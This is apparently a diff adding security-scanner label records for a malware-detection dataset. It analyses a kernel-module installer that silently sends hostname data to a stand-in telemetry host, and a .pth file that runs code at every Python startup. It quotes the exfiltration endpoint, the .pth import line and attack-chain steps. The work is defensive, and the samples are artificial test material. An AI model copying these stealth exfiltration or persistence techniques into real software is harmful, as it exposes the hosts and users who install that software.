+            {
+              "value": "https://build-telemetry.example/report",
+              "context": "Hardcoded telemetry endpoint receiving base64-encoded hostname|kernel|outcome via GET query parameter"
+            }
+          ],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": "/lib/modules/{kernel}/build",
+              "operation": "read",
+              "sensitivity": "medium",
+              "description": "Kernel build tree"
+            }
+          ],
+          "other_indicators": []
+        },
+        "capabilities": {
+          "tags": [
+            "network_outbound",
+            "process_spawn",
+            "privilege_escalation",
+            "data_collection",
+            "data_encoding",
+            "system_reconnaissance"
+          ],
+          "dangerous_apis": [
+            "subprocess.run",
+            "subprocess.check_output",
+            "urllib.request.urlopen",
+            "insmod"
+          ],
+          "network_calls": [
+            {
+              "destination": "https://build-telemetry.example/report",
+              "method": "GET",
+              "purpose": "Silently exfiltrate hostname, kernel version, and build outcome as base64 in query string",
+              "declared": true
+            }
+          ],
+          "commands_executed": [
+            {
+              "command": "uname -r",
+              "method": "subprocess.run",
+              "purpose": "Get running kernel version"
+            },
+            {
+              "command": "hostname",
+              "method": "subprocess.check_output",
+              "purpose": "Get host name for telemetry payload"
+            },
+            {
+              "command": "make -C <build_dir> M=<src> modules",
+              "method": "subprocess.run",
+              "purpose": "Compile kernel module"
+            },
+            {
+              "command": "insmod <module.ko>",
+              "method": "subprocess.run",
+              "purpose": "Load compiled kernel module into running kernel"
+            }
+          ],
+          "env_vars_accessed": [],
+          "crypto_operations": [],
+          "requires_elevated_privileges": true,
+          "modifies_system_state": true
+        },
+        "obfuscation": {
+          "detected": true,
+          "techniques": [
+            "base64",
+            "custom_encoding"
+          ],
+          "layers": 1,
+          "suspicion_score": 0.5,
+          "decoded_content_summary": "File is saved in UTF-16LE with BOM (unusual for Python scripts on Linux kernel tooling); telemetry payload base64-encodes hostname|kernel|outcome before sending via GET query parameter"
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "data_exfiltration",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Silent host reconnaissance telemetry to hardcoded endpoint",
+            "cwe": "CWE-359",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "report_build() base64-encodes hostname, kernel version, and build outcome and POSTs (via GET query) to a hardcoded external URL. Exceptions are silently swallowed so the user never sees the network call. This is system fingerprinting to an attacker-controlled or opaque domain, executed during a privileged installer flow.",
+            "data_flow": "socket.gethostname via `hostname` command + uname -r + build outcome -> base64 encode -> GET query parameter p= -> https://build-telemetry.example/report",
+            "fix": "Remove silent telemetry or make it explicit and opt-in. Log the endpoint, surface failures, and never transmit hostname without consent. Use POST with proper body rather than smuggling data in query string.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1082",
+              "T1041"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "misconfiguration",
+            "severity": "medium",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Unusual UTF-16LE BOM encoding for Python source",
+            "cwe": null,
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "File is stored UTF-16LE with BOM. The stated justification (legacy Windows build environments predating Python UTF-8 support) is implausible for a Linux kernel-module builder that shells out to uname/make/insmod. Non-standard encodings are a known technique to evade naive static scanners and grep-based review.",
+            "data_flow": null,
+            "fix": "Re-save the file as UTF-8. Non-ASCII encoding has no technical benefit for a Linux-only kernel tooling script and obstructs code review.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F003",
+            "type": "privilege_issue",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Loads arbitrary kernel module with full privileges via insmod",
+            "cwe": "CWE-494",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "build_and_load() compiles source from a user-supplied path (sys.argv[1]) with `make M=<source_dir>` and then insmods the resulting .ko into the running kernel. Any attacker who can influence source_dir contents obtains ring-0 code execution. There is no signature verification, path validation, or provenance check on the module.",
+            "data_flow": null,
+            "fix": "Require signed modules (modsign), verify provenance, restrict source_dir to a trusted location, and prefer DKMS with vendor signing. Do not load unsigned kernel objects built from arbitrary paths.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1547.006",
+              "T1014"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F004",
+            "type": "data_exposure",
+            "severity": "medium",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Hostname transmitted to third-party endpoint without consent notice",
+            "cwe": null,
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "Hostname often contains PII or internal infrastructure naming (e.g., `finance-db-prod-01`). The docstring claims telemetry is for compatibility tracking but sends identifying hostname data, not anonymized counters. Under GDPR/CCPA hostname can be personal data.",
+            "data_flow": null,
+            "fix": "Send only anonymized kernel version + outcome, or require explicit opt-in before including hostname. Document the data collection clearly.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "Build-and-load utility for the 'archon' kernel module: detects running kernel, compiles via make against /lib/modules/<k>/build, insmods the resulting .ko, and reports build outcome to a hardcoded telemetry URL.",
+          "risk_narrative": "Despite the benign framing, the script combines three red flags: (1) unusual UTF-16LE BOM encoding that evades simple static review, (2) silent best-effort telemetry of hostname + kernel version + outcome to a hardcoded external domain with exceptions swallowed, and (3) loading an unsigned kernel module compiled from a caller-supplied path, granting ring-0. Together this is a plausible stealth channel for an enterprise-tier installer.",
+          "sensitivity": "high",
+          "data_types": [
+            "hostname",
+            "kernel_version",
+            "build_outcome"
+          ],
+          "data_flows": [
+            {
+              "source": "hostname command output + uname -r + build outcome string",
+              "sink": "https://build-telemetry.example/report (GET query parameter)",
+              "risk": "Silent host fingerprinting to external endpoint; exceptions suppressed so user is unaware",
+              "transforms": [
+                "string concatenation with | delimiter",
+                "base64 encoding",
+                "url query encoding"
+              ]
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "Module docstring and TELEMETRY_URL comment",
+            "mismatch_severity": "medium",
+            "description": "Docstring justifies UTF-16LE BOM via 'legacy Windows build environments' \u2014 yet the script only targets Linux (uname, /lib/modules, make, insmod). The telemetry comment claims compatibility tracking but the implementation sends identifying hostname data silently with exceptions swallowed.",
+            "undeclared_capabilities": [
+              "hostname collection",
+              "silent failure masking",
+              "no opt-out"
+            ]
+          },
+          "exfiltration_risk": {
+            "external_network_calls": [
+              "https://build-telemetry.example/report"
+            ],
+            "encoding_before_sending": "base64 over 'hostname|kernel|outcome' string, placed in p= query parameter",
+            "data_in_logs": null,
+            "data_in_errors": "Exceptions are silently swallowed (`except Exception: pass`) so network failures are invisible to operator"
+          },
+          "obfuscation_signals": {
+            "encoded_strings": [
+              "base64 telemetry payload"
+            ],
+            "dynamic_url_construction": true,
+            "conditional_behavior": null,
+            "comment_code_mismatch": "UTF-16LE encoding justified as 'legacy Windows' on a Linux-only kernel tooling script",
+            "hidden_instructions": null,
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Stealth host inventory + rootkit load via enterprise installer",
+            "likelihood": "medium",
+            "entry_point": "Enterprise-tier installer invokes build_and_load() with root privileges",
+            "impact": "External party learns kernel version and hostname of every deploying host, and an unsigned kernel module from a caller-controlled path is loaded with ring-0 privileges \u2014 enabling persistent rootkit installation.",
+            "steps": [
+              "Installer runs as root and calls build_and_load(source_dir)",
+              "Script collects hostname and kernel version via subprocess",
+              "Data base64-encoded and silently GET'd to build-telemetry.example",
+              "make compiles module from caller-supplied source_dir",
+              "insmod loads unsigned .ko into running kernel (ring-0)"
+            ],
+            "mitre_attack": [
+              "T1082",
+              "T1041",
+              "T1547.006",
+              "T1014"
+            ],
+            "findings_used": [
+              "F001",
+              "F003",
+              "F004"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "reachability_test",
+            "description": "Verify report_build() emits a GET request to build-telemetry.example with base64-encoded hostname|kernel|outcome whenever build_and_load runs.",
+            "test_approach": "Run build_and_load with a stubbed source_dir; intercept urllib via a mock server bound to the telemetry host; decode the p= query param and confirm it contains hostname|kernel|outcome.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "python3",
+              "mock DNS override for build-telemetry.example",
+              "local HTTPS mock"
+            ],
+            "oracle_type": "mock_server",
+            "estimated_complexity": null,
+            "poc_feasible": true,
+            "test_steps": [],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 20
+          },
+          {
+            "id": "H002",
+            "finding_ref": "F003",
+            "type": "exploitability_test",
+            "description": "Demonstrate that an attacker-controlled source_dir results in insmod loading an unsigned .ko with no provenance check.",
+            "test_approach": "Provide a source_dir containing a trivial Makefile + Kbuild producing a harmless .ko with a marker symbol; run build_and_load in a VM; verify insmod was invoked on the attacker-supplied artifact without signature validation.",
+            "suggested_payload": null,
+            "environment_needs": [
+              "VM with kernel headers",
+              "root privileges",
+              "kernel build toolchain"
+            ],
+            "oracle_type": "execution_output",
+            "estimated_complexity": null,
+            "poc_feasible": true,
+            "test_steps": [],
+            "environment_complexity": "multi_process",
+            "estimated_sandbox_time_sec": 180
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "suspicious",
+        "log_summary": "UTF-16LE BOM-encoded Python kernel-module installer with silent base64 telemetry of hostname/kernel to hardcoded endpoint and unsigned insmod of caller-supplied .ko.",
+        "recommended_action": "fix_before_deploy",
+        "validation_status": "static_only"
+      }
+    },
+    "usage": {
+      "input_tokens": 16873,
+      "output_tokens": 4206
+    },
+    "cost_usd": 0.568545,
+    "error": null,
+    "label_timestamp": "2026-04-23T08:12:50.775752+00:00",
+    "label_model": "claude-opus-4-7",
+    "prompt_shape": "raw"
+  },
+  {
+    "file_hash": "47bae48ce4a8d3e2ca02b07360a7289a741413739bf00b2ef6a5381466c38bad",
+    "file_name": "11_sitecustomize_inject.pth",
+    "classification": "malicious",
+    "bucket": null,
+    "stratum_assigned": "attack_vector_extension_pth",
+    "full_label": {
+      "triage": {
+        "file_type": "path_config",
+        "language": "python",
+        "framework": null,
+        "ecosystem": "pypi",
+        "is_ai_component": false,
+        "priority_score": 4,
+        "scan_depth": "full",
+        "pass2_candidate": false,
+        "pass2_reason": "none"
+      },
+      "extractions": {
+        "secrets": [],
+        "entities": {
+          "ips": [],
+          "domains": [],
+          "urls": [],
+          "cloud_resources": [],
+          "file_paths_referenced": [
+            {
+              "path": "/opt/archon/vendor/py27-compat-shim",
+              "operation": "read",
+              "sensitivity": "medium",
+              "description": "Additional sys.path entry added at interpreter startup"
+            }
+          ],
+          "other_indicators": [
+            {
+              "value": "archon.legacy._py27_interop.install()",
+              "indicator_type": "pth_import_line",
+              "context": "Executed on every Python interpreter startup via site.py .pth processing",
+              "line": 6,
+              "severity_hint": "high"
+            }
+          ]
+        },
+        "capabilities": {
+          "tags": [
+            "dynamic_execution",
+            "persistence"
+          ],
+          "dangerous_apis": [
+            "site.addpackage/.pth-import-line"
+          ],
+          "network_calls": [],
+          "commands_executed": [],
+          "env_vars_accessed": [],
+          "crypto_operations": [],
+          "requires_elevated_privileges": false,
+          "modifies_system_state": false
+        },
+        "obfuscation": {
+          "detected": false,
+          "techniques": [],
+          "layers": 0,
+          "suspicion_score": 0.2,
+          "decoded_content_summary": null
+        }
+      },
+      "analysis": {
+        "findings": [
+          {
+            "id": "F001",
+            "type": "supply_chain_risk",
+            "severity": "high",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Implicit code execution via .pth import-line at every Python startup",
+            "cwe": "CWE-506",
+            "cvss_estimate": null,
+            "code_snippet": {
+              "description": "pth import-line payload",
+              "lines": [
+                6,
+                6
+              ]
+            },
+            "explanation": "Python's site.py executes any line in a .pth file that begins with `import` during interpreter initialization. This file ships `import archon.legacy._py27_interop; archon.legacy._py27_interop.install()`, causing install() to run in every Python process that sees this site-packages \u2014 including unrelated virtualenvs, tooling, and CI. This is a classic persistence / supply-chain vector: the payload becomes ambient and invisible to `pip`/import audits, and any future change to install() has global e",
+            "data_flow": null,
+            "fix": "Remove auto-execution from the .pth file. Distribute the compat shim as a normal package and require downstream code to `import archon.legacy` explicitly, or use an opt-in sitecustomize in a dedicated virtualenv. If automatic activation is required, restrict via an environment-variable gate inside install() and document the side effects prominently.",
+            "proof_of_concept": null,
+            "mitre_attack": [
+              "T1546"
+            ],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          },
+          {
+            "id": "F002",
+            "type": "misconfiguration",
+            "severity": "medium",
+            "confidence_label": "high",
+            "confidence": 0.9,
+            "title": "Global sys.path injection of vendor directory",
+            "cwe": "CWE-427",
+            "cvss_estimate": null,
+            "code_snippet": null,
+            "explanation": "The path line `/opt/archon/vendor/py27-compat-shim` is prepended to sys.path for every interpreter. Any module placed under that directory can shadow stdlib or third-party imports system-wide, and the directory sits outside normal package-manager tracking, making tampering or drift difficult to detect.",
+            "data_flow": null,
+            "fix": "Avoid global sys.path injection. Package the shim as a proper distribution installed into the active environment, or scope the path entry to a specific virtualenv via its own sitecustomize.py with documented intent.",
+            "proof_of_concept": null,
+            "mitre_attack": [],
+            "known_cve": null,
+            "patch_available": null,
+            "validated_by": null
+          }
+        ],
+        "behavior": {
+          "purpose": "A Python .pth file that (ab)uses the `import ...` line feature of site.py to automatically execute `archon.legacy._py27_interop.install()` at every interpreter startup and prepend /opt/archon/vendor/py27-compat-shim to sys.path.",
+          "risk_narrative": "`.pth` files with lines beginning `import` are executed by site.py whenever Python initializes. This grants the shipped `archon.legacy._py27_interop.install()` code silent, implicit execution in every Python process on the host \u2014 including unrelated virtualenvs that inherit site-packages \u2014 with no explicit import by the consumer. It also silently injects /opt/archon/vendor/py27-compat-shim onto sys.path, enabling shadowing of stdlib/third-party modules. This is a persistence / supply-chain ampli",
+          "sensitivity": "high",
+          "data_types": [
+            "python_import_path"
+          ],
+          "data_flows": [
+            {
+              "source": "site.py .pth processing at interpreter startup",
+              "sink": "archon.legacy._py27_interop.install()",
+              "risk": "Arbitrary Python code runs in every interpreter without an explicit import by the consumer.",
+              "transforms": [
+                "pth_import_line_execution"
+              ]
+            },
+            {
+              "source": ".pth file path entry",
+              "sink": "sys.path",
+              "risk": "Vendor directory gains import precedence and can shadow stdlib/third-party modules.",
+              "transforms": [
+                "sys.path prepend"
+              ]
+            }
+          ],
+          "trust_boundaries": null,
+          "declared_vs_actual": {
+            "has_declaration": true,
+            "declaration_source": "Header comments claim a benign 'Python 2.7 interop layer' compat shim",
+            "mismatch_severity": "medium",
+            "description": "The stated purpose (legacy compat availability without explicit import) is technically accurate, but the comment downplays that this mechanism executes arbitrary Python on every interpreter start and injects a vendor path globally. Whether install() itself is benign is not verifiable from this file.",
+            "undeclared_capabilities": [
+              "implicit code execution on every Python startup",
+              "global sys.path modification affecting unrelated environments"
+            ]
+          },
+          "exfiltration_risk": null,
+          "obfuscation_signals": {
+            "encoded_strings": [],
+            "dynamic_url_construction": false,
+            "conditional_behavior": null,
+            "comment_code_mismatch": null,
+            "hidden_instructions": null,
+            "fetches_remote_instructions": false
+          }
+        },
+        "attack_chains": [
+          {
+            "name": "Ambient persistence via .pth import-line",
+            "likelihood": "high",
+            "entry_point": "Installation of this .pth into any site-packages directory",
+            "impact": "Attacker (or a later compromised archon.legacy release) gains silent code execution in every Python interpreter on the host, with no explicit import visible to downstream code review.",
+            "steps": [
+              "Package places 11_sitecustomize_inject.pth into site-packages.",
+              "Each Python interpreter startup invokes site.py, which executes the import line.",
+              "archon.legacy._py27_interop.install() runs with the interpreter's privileges.",
+              "Vendor path is prepended to sys.path, enabling module shadowing for later-loaded imports."
+            ],
+            "mitre_attack": [
+              "T1546",
+              "T1195.002"
+            ],
+            "findings_used": [
+              "F001",
+              "F002"
+            ]
+          }
+        ],
+        "hypotheses": [
+          {
+            "id": "H001",
+            "finding_ref": "F001",
+            "type": "reachability_test",
+            "description": "Verify that simply starting `python -c ''` after dropping this .pth into site-packages triggers archon.legacy._py27_interop.install() without any explicit import.",
+            "test_approach": "Install the .pth into a site-packages dir alongside a stub archon.legacy._py27_interop whose install() writes a sentinel file. Launch `python -c 'pass'` and check for the sentinel; also dump sys.path to confirm the vendor dir is present.",
+            "suggested_payload": "stub install() that touches /tmp/archon_pth_fired",
+            "environment_needs": [
+              "python3 interpreter",
+              "writable site-packages",
+              "stub archon.legacy package"
+            ],
+            "oracle_type": "file_access",
+            "estimated_complexity": "low",
+            "poc_feasible": true,
+            "test_steps": [
+              {
+                "step_number": 1,
+                "action": "Place .pth and stub archon.legacy package into an isolated site-packages",
+                "expected_state": "Files present, no process started yet",
+                "depends_on_step": null
+              },
+              {
+                "step_number": 2,
+                "action": "Run `python -c 'import sys; print(sys.path)'`",
+                "expected_state": "Sentinel file created and vendor path visible in sys.path output",
+                "depends_on_step": 1
+              }
+            ],
+            "environment_complexity": "single_process",
+            "estimated_sandbox_time_sec": 20
+          }
+        ]
+      },
+      "verdict": {
+        "verdict_label": "suspicious",
+        "log_summary": ".pth file uses site.py import-line execution to silently run archon.legacy install() and inject a vendor sys.path at every Python startup \u2014 high-impact persistence/supply-chain primitive.",
+        "recommended_action": "review_findings",
+        "validation_status": "static_only"
+      }
+    },
+    "usage": {
+      "input_tokens": 14273,
+      "output_tokens": 3084
+    },
+    "cost_usd": 0.445395,
+    "error": null,
+    "label_timestamp": "2026-04-23T08:13:34.789259+00:00",
+    "label_model": "claude-opus-4-7",
+    "prompt_shape": "raw"
+  }
+]
